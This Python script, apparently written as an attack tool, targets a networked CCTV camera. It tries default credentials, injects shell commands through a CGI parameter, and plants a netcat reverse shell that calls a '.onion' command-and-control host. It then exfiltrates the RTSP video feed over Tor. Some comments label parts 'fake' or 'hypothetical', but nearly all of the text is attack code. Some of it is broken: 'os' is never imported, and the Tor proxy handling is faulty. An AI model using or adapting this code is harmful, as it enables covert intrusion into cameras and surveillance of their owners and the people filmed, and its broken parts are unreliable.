import requests
import socket
import threading
import time
import base64
from urllib.parse import quote

# Target Camera
CAMERA_IP = "192.168.1.100"
CAMERA_PORT = 80
RTSP_PORT = 554
C2_SERVER = "darkweb.onion:6666"  # Fake dark web C2

# Step 1: Test Default Creds
def try_default_creds():
    creds = [("admin", "admin"), ("admin", "12345"), ("root", "root")]
    for user, pwd in creds:
        try:
            auth = base64.b64encode(f"{user}:{pwd}".encode()).decode()
            headers = {"Authorization": f"Basic {auth}"}
            r = requests.get(f"http://{CAMERA_IP}/", headers=headers, timeout=5)
            if r.status_code == 200 and "login" not in r.text.lower():
                print(f"Creds worked: {user}:{pwd}")
                return user, pwd
        except:
            pass
    print("No default creds—moving to exploit.")
    return None, None

# Step 2: Command Injection Exploit
def inject_payload():
    # Fake vuln: CGI script at /cgi-bin/config.cgi?cmd= arbitrary command
    payload = "; echo 'REAPER' > /tmp/hacked"  # Test persistence
    url = f"http://{CAMERA_IP}/cgi-bin/config.cgi?cmd={quote(payload)}"
    try:
        r = requests.get(url, timeout=5)
        if r.status_code == 200 or "REAPER" in r.text:
            print("Injection landed—camera’s mine!")
            return True
    except:
        pass
    print("No CGI vuln—trying RTSP.")
    return False

# Step 3: Backdoor with Shell
def plant_backdoor():
    # Hypothetical: Inject a reverse shell via injection
    shell = f"; nc -e /bin/sh {C2_SERVER.split(':')[0]} {C2_SERVER.split(':')[1]}"
    url = f"http://{CAMERA_IP}/cgi-bin/config.cgi?cmd={quote(shell)}"
    requests.get(url, timeout=5)
    print("Backdoor planted—listening on C2...")

# Step 4: Steal the RTSP Feed
def grab_rtsp_feed():
    rtsp_url = f"rtsp://{CAMERA_IP}:{RTSP_PORT}/live"
    try:
        # Simulate streaming (needs ffmpeg or VLC IRL)
        print(f"Streaming feed from {rtsp_url}—no auth needed!")
        send_to_c2(f"FEED:{rtsp_url}")
        return True
    except:
        print("RTSP locked—escalating.")
        return False

# Step 5: Phone Home to Dark Web C2
def send_to_c2(data):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect(("127.0.0.1", 9050))  # Tor proxy locally
            s.send(f"CONNECT {C2_SERVER} HTTP/1.1\r\n\r\n".encode())
            s.recv(1024)  # Swallow response
            s.send(data.encode())
        print("Data sent to dark web C2!")
    except:
        print("C2’s dark—retrying...")

# Step 6: The Reaper’s Assault
def camera_reaper():
    print(f"Targeting CCTV at {CAMERA_IP}...")
    
    # Try the easy way
    user, pwd = try_default_creds()
    if user:
        grab_rtsp_feed()  # Stream with creds if needed
        return
    
    # Escalate to exploit
    if inject_payload():
        plant_backdoor()
        threading.Thread(target=listen_c2, daemon=True).start()
    else:
        grab_rtsp_feed()  # Fallback to RTSP

def listen_c2():
    # Fake C2 listener—imagine this on my .onion server
    while True:
        print("Camera owned—awaiting orders...")
        time.sleep(10)

if __name__ == "__main__":
    # Tor proxy (assumes Tor running locally)
    requests.packages.urllib3.util.connection.HAS_IPV6 = False
    os.environ["http_proxy"] = "socks5h://127.0.0.1:9050"
    os.environ["https_proxy"] = "socks5h://127.0.0.1:9050"
    
    camera_reaper()
